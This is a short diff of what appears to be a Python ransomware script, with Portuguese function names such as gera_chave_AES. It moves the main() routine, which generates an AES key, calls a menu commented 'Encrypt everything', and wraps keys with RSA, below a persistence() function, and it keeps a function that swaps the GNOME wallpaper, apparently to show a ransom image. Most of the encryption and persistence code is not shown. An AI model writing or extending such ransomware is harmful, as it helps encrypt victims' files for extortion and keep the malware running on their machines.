@@ -184,15 +184,11 @@ def gera_chave_AES():
         f.write(senha)
     return senha
 
+
 # change the backgroud of the computer
 def change_background():
     os.system('gsettings set org.gnome.desktop.background picture-uri '+ os.getcwd()+'/wallpaper.jpg')
 
-def main():
-    AES_key = gera_chave_AES()
-    menu(AES_key) # -> Encrypt everything
-    AES_to_RSA()
-    RSA_to_SRSA()
 
 def persistence():
     def generate_decryptor():
@@ -232,6 +228,13 @@ def persistence():
                                                                                                                                  , stdin=subprocess.PIPE
                                                                                                                                  , stdout=subprocess.PIPE
                                                                                                                                  , stderr=subprocess.PIPE)
+
+# main function
+def main():
+    AES_key = gera_chave_AES()
+    menu(AES_key) # -> Encrypt everything
+    AES_to_RSA()
+    RSA_to_SRSA()
 
 if __name__ == "__main__":
     main()
